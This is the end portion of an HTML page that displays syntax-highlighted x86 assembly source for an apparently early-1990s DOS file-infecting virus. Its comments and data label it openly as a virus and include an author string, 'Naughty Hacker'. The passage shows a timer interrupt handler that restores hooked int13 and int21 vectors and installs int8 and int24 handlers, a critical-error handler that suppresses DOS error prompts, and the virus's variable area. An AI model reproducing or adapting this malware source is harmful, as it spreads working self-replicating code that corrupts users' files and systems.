             </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">   </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TimerOff</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Call original timer</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc0">  </span><span class="sc1">; Save AX</span><span class="sc0">
             </span><span class="sc6">PUSH</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc0">  </span><span class="sc1">; Save DS</span><span class="sc0">
             </span><span class="sc6">SUB</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Set DS to interrupt table</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">CLI</span><span class="sc0">        </span><span class="sc1">; Disable interrupts</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int13off</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Restore int13 address</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">004C</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int13seg</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">004E</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0020</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TimerHandler</span><span class="sc0">  </span><span class="sc1">; Set int8</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0022</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dos21off</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Restore int21 address</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0084</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TableSegment</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0086</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">

             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CriticalError</span><span class="sc0">     </span><span class="sc1">; Set int24</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0090</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc2">0092</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">

             </span><span class="sc6">STI</span><span class="sc0">            </span><span class="sc1">; Enable interrupts</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">      </span><span class="sc1">; Restore DS</span><span class="sc0">
             </span><span class="sc6">POP</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Restore AX</span><span class="sc0">
             </span><span class="sc6">IRET</span><span class="sc0">           </span><span class="sc1">; Terminate timing</span><span class="sc0">
</span><span class="sc5">CriticalError</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">       </span><span class="sc1">; If critical error</span><span class="sc0">
             </span><span class="sc6">IRET</span><span class="sc0">           </span><span class="sc1">; then simulate Ignore</span><span class="sc0">
</span><span class="sc5">VirusAuthor</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Sofia,Feb '</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">27h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'91 Naughty Hacker.'</span><span class="sc0">    </span><span class="sc1">; Replace this string with HORSE</span><span class="sc0">
</span><span class="sc5">EndAuthor</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc5">LastCode</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">        </span><span class="sc1">; This is virus in file</span><span class="sc0">

</span><span class="sc5">Int21off</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Variable area</span><span class="sc0">
</span><span class="sc5">Int21seg</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; NOT writed in file</span><span class="sc0">
</span><span class="sc5">Int2Foff</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Int2Fseg</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TimerOff</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TimerSeg</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Int13off</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Int13seg</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Dos21off</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TableSegment</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileSizeLow</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FileSizeHi</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FunCounter</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Executed function counter</span><span class="sc0">
</span><span class="sc5">LastByte</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">        </span><span class="sc1">; Memory size of virus</span><span class="sc0">
</span></div></body>
</html>
